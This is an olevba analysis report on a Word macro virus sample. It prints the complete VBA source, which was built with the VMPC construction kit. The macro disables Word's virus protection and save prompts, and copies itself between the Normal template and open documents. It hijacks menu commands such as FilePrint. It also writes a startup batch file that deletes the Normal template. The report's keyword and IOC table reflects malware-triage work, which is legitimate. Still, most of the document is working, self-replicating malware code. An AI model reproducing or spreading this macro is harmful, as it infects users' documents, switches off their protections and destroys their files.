olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-82024c95dfeae5e5f59241cce7a3d783a8a7de12
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-82024c95dfeae5e5f59241cce7a3d783a8a7de12 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iraballymoney.bas 
in file: Virus.MSWord.VMPC-based-82024c95dfeae5e5f59241cce7a3d783a8a7de12 - OLE stream: 'Macros/VBA/iraballymoney'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub iraballymoney()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Live for Now"
    'Poppy ID : 40896368-2279
    
    
On Error Resume Next
f7872 = u16068 & c15937 & k10122 & m16068
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
f5848 = u6396 & c9690 & Int(Rnd * 3121)
f11859 = u11232 & c7814 & Int(Rnd * 8437)
ActiveDocument.ReadOnlyRecommended = False
f8383 = u13024 & c13350 & Int(Rnd * 8949)
x6368408910 = 0
Set qq4089636811 = MacroContainer
f13073 = u13035 & c13562 & k13341 & m13035
k9310 = m12787 & e12303
 f1933$ = "c:\windows\startm~1\programs\startup\msfile.bat"
b50274089 = GetAttr(NormalTemplate.FullName)
k8967 = m3690 & e11128
If b50274089 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1933$)
If b50274089 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1933$)
f8848 = u11141 & c9217 & k7564 & m11141
If b50274089 = vbReadOnly Then GoTo fuckoff
If b50274089 = vbReadOnly + vbArchive Then GoTo fuckoff
k14687 = m13272 & e2069
If qq4089636811 = NormalTemplate Then x6368408910 = 1
f16085 = u13126 & c12160 & Int(Rnd * 9104)
If x6368408910 = 1 Then i1i63682 = NormalTemplate.FullName Else i1i63682 = ActiveDocument.FullName
If x6368408910 = 1 Then ki40898 = ActiveDocument.FullName Else ki40898 = NormalTemplate.FullName
Application.OrganizerCopy Source:=i1i63682, Destination:=ki40898, Name:="iraballymoney", Object:=wdOrganizerObjectProjectItems
f8501 = u3458 & c4692 & k5922 & m3458
If x6368408910 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f8727 = u4844 & c18088 & Int(Rnd * 9807)
If x6368408910 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
k8081 = m6976 & e7428
     End If
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "IRA-Ballymoney", vbInformation
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call iraballymoney
End Sub
Sub ToolsMacro()
    On Error Resume Next
End Sub
Sub FileTemplates()
    On Error Resume Next
f10107 = u13852 & c6618 & k14832 & m13852
f16118 = u8688 & c4742 & Int(Rnd * 3565)
End Sub
Sub ViewVBCode()
    On Error Resume Next
k6208 = m10244 & e6593
k10802 = m3605 & e10900
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f8893 = u2048 & c10870 & Int(Rnd * 2470)
f13285 = u11146 & c7996 & k5865 & m11146
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
f2298 = u10729 & c5645 & k1586 & m10729
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f10345 = u584 & c9087 & Int(Rnd * 5784)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

